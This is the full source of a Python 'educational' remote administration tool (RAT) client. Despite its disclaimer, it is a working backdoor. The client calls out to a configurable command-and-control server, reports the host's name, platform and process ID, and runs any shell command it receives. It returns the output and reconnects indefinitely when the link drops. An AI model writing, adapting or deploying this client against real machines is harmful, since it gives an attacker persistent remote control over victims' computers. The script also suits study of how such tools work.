#!/usr/bin/env python3
"""
Educational Remote Administration Tool (RAT) client.

This script is intentionally simple and is meant ONLY for learning about
basic client/server networking concepts. Do NOT run this against any
system or network you do not own or have explicit permission to test.

Usage (example, from the machine being controlled):
    python rat.py --host 127.0.0.1 --port 9001

Then run the CNC server on your own machine and connect to it.
"""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import threading
import time
from typing import Any, Dict


DEFAULT_RECONNECT_DELAY = 5.0  # seconds (can be overridden via config)
DEFAULT_HEARTBEAT_INTERVAL = 20.0  # seconds (can be overridden via config)


def send_json_line(sock: socket.socket, payload: Dict[str, Any]) -> None:
    """
    Send a single JSON object, newline-terminated.
    """
    data = (json.dumps(payload) + "\n").encode("utf-8", errors="ignore")
    sock.sendall(data)


def recv_json_line(sock: socket.socket) -> Dict[str, Any] | None:
    """
    Receive a single JSON object, assuming newline-delimited messages.
    Returns None if the connection is closed.
    """
    chunks: list[bytes] = []
    while True:
        chunk = sock.recv(1)
        if not chunk:
            # connection closed
            if not chunks:
                return None
            break
        if chunk == b"\n":
            break
        chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


def run_command(cmd: str, cwd: str | None = None) -> Dict[str, Any]:
    """
    Run a shell command and capture stdout, stderr and exit code.
    """
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
        )
        return {
            "ok": True,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
            "returncode": completed.returncode,
        }
    except Exception as exc:  # pragma: no cover - defensive
        return {"ok": False, "error": repr(exc)}


def heartbeat_loop(
    sock: socket.socket, stop_event: threading.Event, interval: float
) -> None:
    """
    Periodically send a small heartbeat so the server can see we're alive.
    """
    while not stop_event.is_set():
        try:
            send_json_line(sock, {"type": "heartbeat", "cwd": os.getcwd()})
        except OSError:
            break
        stop_event.wait(interval)


def client_loop(host: str, port: int, reconnect_delay: float, hb_interval: float) -> None:
    """
    Connect to the CNC server and process commands.
    """
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, port))
        except OSError as exc:
            print(f"[rat] Failed to connect to {host}:{port}: {exc}", file=sys.stderr)
            time.sleep(reconnect_delay)
            continue

        print(f"[rat] Connected to CNC at {host}:{port}")
        stop_event = threading.Event()
        hb_thread = threading.Thread(
            target=heartbeat_loop,
            args=(sock, stop_event, hb_interval),
            daemon=True,
        )
        hb_thread.start()

        # Send initial hello
        hello_payload = {
            "type": "hello",
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "platform": sys.platform,
            "pid": os.getpid(),
        }
        try:
            send_json_line(sock, hello_payload)
        except OSError:
            sock.close()
            continue

        try:
            while True:
                msg = recv_json_line(sock)
                if msg is None:
                    print("[rat] CNC disconnected")
                    break

                msg_type = msg.get("type")

                if msg_type == "ping":
                    send_json_line(sock, {"type": "pong"})
                elif msg_type == "exec":
                    cmd = msg.get("cmd") or ""
                    resp = run_command(cmd)
                    send_json_line(
                        sock,
                        {
                            "type": "exec_result",
                            "cmd": cmd,
                            "result": resp,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "cd":
                    path = msg.get("path") or ""
                    try:
                        os.chdir(path)
                        ok = True
                        err = ""
                    except OSError as exc:
                        ok = False
                        err = str(exc)
                    send_json_line(
                        sock,
                        {
                            "type": "cd_result",
                            "ok": ok,
                            "error": err,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "pwd":
                    send_json_line(sock, {"type": "pwd_result", "cwd": os.getcwd()})
                elif msg_type == "exit":
                    print("[rat] Received exit command, closing.")
                    send_json_line(sock, {"type": "bye"})
                    sock.close()
                    return
                else:
                    # Unknown command
                    send_json_line(
                        sock,
                        {
                            "type": "error",
                            "error": f"Unknown command type: {msg_type!r}",
                        },
                    )
        finally:
            stop_event.set()
            try:
                sock.close()
            except OSError:
                pass

        # Try to reconnect after a delay
        time.sleep(DEFAULT_RECONNECT_DELAY)


def load_config() -> Dict[str, Any]:
    """
    Load configuration from config.json in the same directory as this script,
    if it exists. Returns an empty dict if it cannot be loaded.
    """
    path = os.path.join(os.path.dirname(__file__), "config.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except OSError:
        return {}
    except json.JSONDecodeError:
        # Ignore invalid config to keep the client running
        return {}


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational RAT client that connects to a CNC server.",
    )
    parser.add_argument(
        "--host",
        help="CNC server hostname or IP (overrides config.json if provided)",
    )
    parser.add_argument(
        "--port",
        type=int,
        help="CNC server TCP port (overrides config.json if provided)",
    )
    parser.add_argument(
        "--reconnect-delay",
        type=float,
        help="Seconds to wait before reconnecting (overrides config.json if provided)",
    )
    parser.add_argument(
        "--heartbeat-interval",
        type=float,
        help="Seconds between heartbeat messages (overrides config.json if provided)",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    cfg = load_config()
    client_cfg = cfg.get("client") if isinstance(cfg, dict) else {}

    args = parse_args(argv)

    host = args.host or (client_cfg.get("host") if isinstance(client_cfg, dict) else None) or "127.0.0.1"
    port = args.port or int(
        (client_cfg.get("port") if isinstance(client_cfg, dict) else 9001)
    )
    reconnect_delay = (
        args.reconnect_delay
        if args.reconnect_delay is not None
        else float(
            (client_cfg.get("reconnect_delay") if isinstance(client_cfg, dict) else DEFAULT_RECONNECT_DELAY)
        )
    )
    hb_interval = (
        args.heartbeat_interval
        if args.heartbeat_interval is not None
        else float(
            (client_cfg.get("heartbeat_interval") if isinstance(client_cfg, dict) else DEFAULT_HEARTBEAT_INTERVAL)
        )
    )

    client_loop(host, port, reconnect_delay, hb_interval)


if __name__ == "__main__":
    main()


